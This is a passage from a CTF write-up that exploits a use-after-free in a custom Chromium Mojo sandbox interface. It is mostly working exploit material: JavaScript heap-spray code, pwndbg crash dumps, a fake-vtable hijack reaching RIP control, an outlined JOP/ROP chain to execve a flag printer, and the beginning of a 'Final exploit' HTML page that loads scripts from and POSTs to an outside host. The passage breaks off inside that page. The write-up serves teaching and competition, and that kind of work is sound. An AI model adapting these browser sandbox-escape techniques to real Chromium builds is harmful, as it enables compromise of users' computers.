  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">clients</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">newClient</span><span class="p">());</span>
  <span class="p">}</span>

  <span class="kd">let</span> <span class="nx">spray</span> <span class="o">=</span> <span class="p">[];</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">spray</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">newClient</span><span class="p">());</span>
  <span class="p">}</span>

  <span class="kd">let</span> <span class="nx">iface</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>

  <span class="c1">// sizeof(class SandboxImpl) + 0x800</span>
  <span class="kd">let</span> <span class="nx">arg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="mh">0x1020</span><span class="p">);</span>
  <span class="nx">arg</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mh">0x41</span><span class="p">);</span>

  <span class="c1">// Enqueue a lot of tasks on the I/O thread</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">clients</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">clients</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">iface</span><span class="p">.</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
    <span class="nx">iface</span><span class="p">.</span><span class="nx">ptr</span><span class="p">.</span><span class="nx">reset</span><span class="p">();</span>
    <span class="nx">iface</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>
  <span class="p">}</span>

  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">spray</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">spray</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="nx">print</span><span class="p">(</span><span class="dl">'</span><span class="s1">done</span><span class="dl">'</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">pwn</span><span class="p">();</span>
</code></pre></div></div>

<p>If we run this we get a very promising-looking crash:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Thread 8 "Chrome_IOThread" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff1504640 (LWP 12533)]
reset () at ../../buildtools/third_party/libc++/trunk/include/__memory/unique_ptr.h:281
281	      __ptr_.second()(__tmp);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
*RAX  0x2a8000ef7620 ◂— 0x0
*RBX  0x2a8000ef6e00 ◂— 0x4141414141414141 ('AAAAAAAA')
 RCX  0x41
*RDX  0x2a8000ef7600 ◂— 0x4141414141414141 ('AAAAAAAA')
*RDI  0x2a8001181aa0 —▸ 0x2a8000ef6e00 ◂— 0x4141414141414141 ('AAAAAAAA')
*RSI  0x800
*R8   0x2a8000ef6e00 ◂— 0x4141414141414141 ('AAAAAAAA')
*R9   0x7ffff1502ec4 ◂— 0x6e4ac20038323134 /* '4128' */
 R10  0x0
 R11  0x293
*R12  0x2a8000285000 ◂— 0x4141414141414141 ('AAAAAAAA')
*R13  0x2a8000286020 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*R14  0x2a8000ef7620 ◂— 0x0
*R15  0x4141414141414141 ('AAAAAAAA')
 RBP  0x7ffff1503040 —▸ 0x7ffff15030d0 —▸ 0x7ffff1503350 —▸ 0x7ffff1503400 —▸ 0x7ffff1503420 ◂— ...
 RSP  0x7ffff1502ff0 —▸ 0x7ffff1503010 —▸ 0x2a80003de000 ◂— 0x6400000000
*RIP  0x55555b7b2132 ◂— mov rdi, qword ptr [r15]
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x55555b7b2132    mov    rdi, qword ptr [r15]
   0x55555b7b2135    test   rdi, rdi
   0x55555b7b2138    je     0x55555b7b2159                &lt;0x55555b7b2159&gt;
    ↓
   0x55555b7b2159    mov    rdi, r15
   0x55555b7b215c    call   free                &lt;free&gt;

   0x55555b7b2161    mov    rax, qword ptr [rbx]
   0x55555b7b2164    lea    rsi, [rbp - 0x40]
   0x55555b7b2168    mov    rdi, rbx
   0x55555b7b216b    call   qword ptr [rax + 0x20]

   0x55555b7b216e    mov    rdi, qword ptr [rbp - 0x40]
   0x55555b7b2172    test   rdi, rdi
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffff1502ff0 —▸ 0x7ffff1503010 —▸ 0x2a80003de000 ◂— 0x6400000000
01:0008│     0x7ffff1502ff8 —▸ 0x2a8001181aa0 —▸ 0x2a8000ef6e00 ◂— 0x4141414141414141 ('AAAAAAAA')
02:0010│     0x7ffff1503000 —▸ 0x2a80003dd800 ◂— 0x4141414141414141 ('AAAAAAAA')
03:0018│     0x7ffff1503008 —▸ 0x2a80003de000 ◂— 0x6400000000
04:0020│     0x7ffff1503010 —▸ 0x2a80003de000 ◂— 0x6400000000
05:0028│     0x7ffff1503018 —▸ 0x2a8000348000 ◂— 0x0
06:0030│     0x7ffff1503020 —▸ 0x7ffff15030f0 —▸ 0x5555636cb400 (base::DefaultTickClock::GetInstance()::default_tick_clock) —▸ 0x555562f48590 —▸ 0x555558e19a90 ◂— ...
07:0038│     0x7ffff1503028 —▸ 0x2a8000314780 —▸ 0x55556304c550 —▸ 0x55555cffbe60 (base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::~ThreadControllerWithMessagePumpImpl()) ◂— push rbp
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► f 0   0x55555b7b2132
   f 1   0x55555b7b2132
   f 2   0x55555b7b2132
   f 3   0x55555cfe4fe1 base::TaskAnnotator::RunTaskImpl(base::PendingTask&amp;)+257
   f 4   0x55555cfe4fe1 base::TaskAnnotator::RunTaskImpl(base::PendingTask&amp;)+257
   f 5   0x55555cffd32d base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+1277
   f 6   0x55555cffd32d base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+1277
   f 7   0x55555cffcc1f base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+127
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; bt
#0  reset () at ../../buildtools/third_party/libc++/trunk/include/__memory/unique_ptr.h:281
#1  operator= () at ../../buildtools/third_party/libc++/trunk/include/__memory/unique_ptr.h:215
#2  Pour() () at ../../content/browser/sandbox/sandbox_impl.cc:59
#3  0x000055555cfe4fe1 in Run () at ../../base/functional/callback.h:152
#4  RunTaskImpl() () at ../../base/task/common/task_annotator.cc:156
#5  0x000055555cffd32d in RunTask&lt;(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:451:11)&gt; () at ../../base/task/common/task_annotator.h:85
#6  DoWorkImpl() () at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:449
#7  0x000055555cffcc1f in DoWork() () at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:300
#8  0x000055555cffdab5 in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ()
#9  0x000055555d056723 in Run() () at ../../base/message_loop/message_pump_libevent.cc:292
#10 0x000055555cffde0b in Run() () at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:609
#11 0x000055555cfc3e19 in Run() () at ../../base/run_loop.cc:141
#12 0x000055555d01d0f8 in base::Thread::Run(base::RunLoop*) () at ../../base/threading/thread.cc:338
#13 0x000055555b138a60 in content::BrowserProcessIOThread::IOThreadRun(base::RunLoop*) () at ../../content/browser/browser_process_io_thread.cc:119
#14 0x000055555d01d217 in ThreadMain() () at ../../base/threading/thread.cc:408
#15 0x000055555d0449af in ThreadFunc() () at ../../base/threading/platform_thread_posix.cc:103
#16 0x00007ffff7168b43 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442
#17 0x00007ffff71faa00 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81

pwndbg&gt; tele $r15
&lt;Could not read memory at 0x4141414141414141&gt;
</code></pre></div></div>

<p>It looks like Chromium is crashing in <code class="language-plaintext highlighter-rouge">Pour</code> where it assigns the new <code class="language-plaintext highlighter-rouge">std::vector</code> to <code class="language-plaintext highlighter-rouge">this-&gt;backup_</code>. This almost certainly happens because we’ve reclaimed the the object with our spray and so the code thinks that <code class="language-plaintext highlighter-rouge">this-&gt;backup_</code> already points to an object which must be freed. This is a good crash because it shows that we can indeed reclaim the freed object with controlled data, but it would much more useful if we could reach the following line which has a virtual function call. We can fix this crash by spraying a fake <code class="language-plaintext highlighter-rouge">SandboxImpl</code> that has <code class="language-plaintext highlighter-rouge">backup_</code> set to <code class="language-plaintext highlighter-rouge">nullptr</code> instead of 0x4141414141414141.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">clients</span> <span class="o">=</span> <span class="p">[];</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">clients</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">newClient</span><span class="p">());</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">spray</span> <span class="o">=</span> <span class="p">[];</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">spray</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">newClient</span><span class="p">());</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">iface</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>

<span class="kd">let</span> <span class="nx">arg2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mh">0x1020</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>
<span class="nx">arg2</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="nx">n</span><span class="p">);</span>
<span class="nx">arg2</span><span class="p">[</span><span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span> <span class="o">+</span> <span class="mh">0x818</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">arg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">arg2</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">clients</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">clients</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">iface</span><span class="p">.</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
  <span class="nx">iface</span><span class="p">.</span><span class="nx">ptr</span><span class="p">.</span><span class="nx">reset</span><span class="p">();</span>
  <span class="nx">iface</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">spray</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">spray</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Thread 8 "Chrome_IOThread" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff1504640 (LWP 12689)]
0x000055555b7b216b in Pour () at ../../content/browser/sandbox/sandbox_impl.cc:60
60	            this-&gt;PourSand(sand_for_box);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
*RAX  0x4141414141414141 ('AAAAAAAA')
*RBX  0x12c000ee7800 ◂— 0x4141414141414141 ('AAAAAAAA')
 RCX  0x0
*RDX  0x12c000ee8000 ◂— 0x4141414141414141 ('AAAAAAAA')
*RDI  0x12c000ee7800 ◂— 0x4141414141414141 ('AAAAAAAA')
 RSI  0x7ffff1503000 —▸ 0x12c0003dd800 ◂— 0x4141414141414141 ('AAAAAAAA')
*R8   0x12c000ee7800 ◂— 0x4141414141414141 ('AAAAAAAA')
 R9   0x7ffff1502ec4 ◂— 0x4abb410038323134 /* '4128' */
 R10  0x0
 R11  0x293
*R12  0x12c000285000 ◂— 0x4141414141414141 ('AAAAAAAA')
*R13  0x12c000286020 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*R14  0x12c000ee8020 ◂— 0x0
 R15  0x0
 RBP  0x7ffff1503040 —▸ 0x7ffff15030d0 —▸ 0x7ffff1503350 —▸ 0x7ffff1503400 —▸ 0x7ffff1503420 ◂— ...
 RSP  0x7ffff1502ff0 —▸ 0x7ffff1503010 —▸ 0x12c0003de000 ◂— 0x6400000000
 RIP  0x55555b7b216b ◂— call qword ptr [rax + 0x20]
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
   0x55555b7b2159    mov    rdi, r15
   0x55555b7b215c    call   free                &lt;free&gt;

   0x55555b7b2161    mov    rax, qword ptr [rbx]
   0x55555b7b2164    lea    rsi, [rbp - 0x40]
   0x55555b7b2168    mov    rdi, rbx
 ► 0x55555b7b216b    call   qword ptr [rax + 0x20]

   0x55555b7b216e    mov    rdi, qword ptr [rbp - 0x40]
   0x55555b7b2172    test   rdi, rdi
   0x55555b7b2175    je     0x55555b7b21cf                &lt;0x55555b7b21cf&gt;

   0x55555b7b2177    mov    rax, qword ptr [rbp - 0x38]
   0x55555b7b217b    mov    rcx, rax
─────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────
In file: /stuff/chromium/src/content/browser/sandbox/sandbox_impl.cc
   57         if (sand_sz &gt; 0x800) {
   58             std::vector&lt;uint8_t&gt; sand_for_box(sand.begin(), sand.begin()+0x800);
   59             this-&gt;backup_ = std::make_unique&lt;std::vector&lt;uint8_t&gt;&gt;(sand.begin()+0x800, sand.end());
 ► 60             this-&gt;PourSand(sand_for_box);
   61         } else {
   62             for ( i = 0 ; i &lt; sand_sz ; i++) {
   63                 this-&gt;box_[i] = sand[i];
   64             }
   65         }
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffff1502ff0 —▸ 0x7ffff1503010 —▸ 0x12c0003de000 ◂— 0x6400000000
01:0008│     0x7ffff1502ff8 —▸ 0x12c001169ca0 —▸ 0x12c000ee7800 ◂— 0x4141414141414141 ('AAAAAAAA')
02:0010│ rsi 0x7ffff1503000 —▸ 0x12c0003dd800 ◂— 0x4141414141414141 ('AAAAAAAA')
03:0018│     0x7ffff1503008 —▸ 0x12c0003de000 ◂— 0x6400000000
04:0020│     0x7ffff1503010 —▸ 0x12c0003de000 ◂— 0x6400000000
05:0028│     0x7ffff1503018 —▸ 0x12c000348000 ◂— 0x0
06:0030│     0x7ffff1503020 —▸ 0x7ffff15030f0 —▸ 0x5555636cb400 (base::DefaultTickClock::GetInstance()::default_tick_clock) —▸ 0x555562f48590 —▸ 0x555558e19a90 ◂— ...
07:0038│     0x7ffff1503028 —▸ 0x12c000314780 —▸ 0x55556304c550 —▸ 0x55555cffbe60 (base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::~ThreadControllerWithMessagePumpImpl()) ◂— push rbp
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► f 0   0x55555b7b216b
   f 1   0x55555cfe4fe1 base::TaskAnnotator::RunTaskImpl(base::PendingTask&amp;)+257
   f 2   0x55555cfe4fe1 base::TaskAnnotator::RunTaskImpl(base::PendingTask&amp;)+257
   f 3   0x55555cffd32d base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+1277
   f 4   0x55555cffd32d base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+1277
   f 5   0x55555cffcc1f base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+127
   f 6   0x55555cffdab5
   f 7   0x55555d056723 base::MessagePumpLibevent::Run(base::MessagePump::Delegate*)+211
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

pwndbg&gt; x/10gx $rdi
0x12c000ee7800:	0x4141414141414141	0x4141414141414141
0x12c000ee7810:	0x4141414141414141	0x4141414141414141
0x12c000ee7820:	0x4141414141414141	0x4141414141414141
0x12c000ee7830:	0x4141414141414141	0x4141414141414141
0x12c000ee7840:	0x4141414141414141	0x4141414141414141
</code></pre></div></div>

<p>Much better! We now have a virtual call with a controlled vtable pointer. The easiest way to exploit this is to store a fake vtable in the <code class="language-plaintext highlighter-rouge">box_</code> of a <code class="language-plaintext highlighter-rouge">SandboxImpl</code>, leak its address using <code class="language-plaintext highlighter-rouge">GetHeapAddress</code> and point our fake <code class="language-plaintext highlighter-rouge">SandboxImpl</code>’s vtable there for RIP control.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>
  <span class="kd">let</span> <span class="nx">fake_vtable</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>

  <span class="nx">fake_vtable</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mh">0x41414141</span><span class="nx">n</span><span class="p">);</span>
  <span class="nx">fake</span><span class="p">.</span><span class="nx">pourSand</span><span class="p">(</span><span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">fake_vtable</span><span class="p">.</span><span class="nx">buffer</span><span class="p">));</span>

  <span class="kd">const</span> <span class="nx">heap_leak</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">getHeapAddress</span><span class="p">()).</span><span class="nx">addr</span><span class="p">;</span>
  <span class="kd">let</span> <span class="nx">boxed_mem</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">heap_leak</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x18</span><span class="nx">n</span><span class="p">;</span>
  <span class="nx">print</span><span class="p">(</span><span class="s2">`Fake VTable at: </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">boxed_mem</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>

  <span class="kd">let</span> <span class="nx">clients</span> <span class="o">=</span> <span class="p">[];</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">clients</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">newClient</span><span class="p">());</span>
  <span class="p">}</span>

  <span class="kd">let</span> <span class="nx">spray</span> <span class="o">=</span> <span class="p">[];</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">spray</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">newClient</span><span class="p">());</span>
  <span class="p">}</span>

  <span class="kd">let</span> <span class="nx">iface</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>

  <span class="kd">let</span> <span class="nx">arg2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mh">0x1020</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>
  <span class="nx">arg2</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="nx">n</span><span class="p">);</span>
  <span class="nx">arg2</span><span class="p">[</span><span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">boxed_mem</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
  <span class="nx">arg2</span><span class="p">[</span><span class="mh">0x800</span> <span class="o">/</span> <span class="mi">8</span> <span class="o">+</span> <span class="mh">0x818</span> <span class="o">/</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span>
  <span class="kd">let</span> <span class="nx">arg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">arg2</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>

  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">clients</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">clients</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">iface</span><span class="p">.</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
    <span class="nx">iface</span><span class="p">.</span><span class="nx">ptr</span><span class="p">.</span><span class="nx">reset</span><span class="p">();</span>
    <span class="nx">iface</span> <span class="o">=</span> <span class="nx">newClient</span><span class="p">();</span>
  <span class="p">}</span>

  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">spray</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">spray</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">pourSand</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
  <span class="p">}</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Thread 8 "Chrome_IOThread" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff1504640 (LWP 12853)]
0x0000000041414141 in ?? ()
</code></pre></div></div>

<p>🥳</p>

<p>At this point we just have to set up a JOP + ROP chain near our fake VTable and use it to launch the flag printer. In short we jump to a stack pivot JOP gadget and point RSP to our fake vtable, then from there execute a ROP chain that runs <code class="language-plaintext highlighter-rouge">execve("/home/chrome/flag_printer")</code>. Nothing special. The chrome binary has a lot of gadgets so we don’t even need to leak the address of libc.</p>

<p><code class="language-plaintext highlighter-rouge">hitcon{d0nt_U53_uNR3+4N3d_uSe_W34k_PtR_1nStEaD}</code></p>

<h2 id="final-exploit">Final exploit:</h2>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>

<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://chain.galli.me:8080/mojo/mojo_bindings.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://chain.galli.me:8080/mojo/third_party/blink/public/mojom/sandbox/sandbox.mojom.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

<span class="nt">&lt;script&gt;</span>
<span class="kd">let</span> <span class="nx">printbuf</span> <span class="o">=</span> <span class="p">[];</span>
<span class="kd">function</span> <span class="nx">print</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">printbuf</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nx">uploadLogs</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://chain.galli.me:8080/logs</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">body</span><span class="p">:</span> <span class="nx">printbuf</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">),</span>
  <span class="p">});</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="s2">`0x</span><span class="p">${</span><span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">newClient</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">iface</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">SandboxPtr</span><span class="p">();</span>
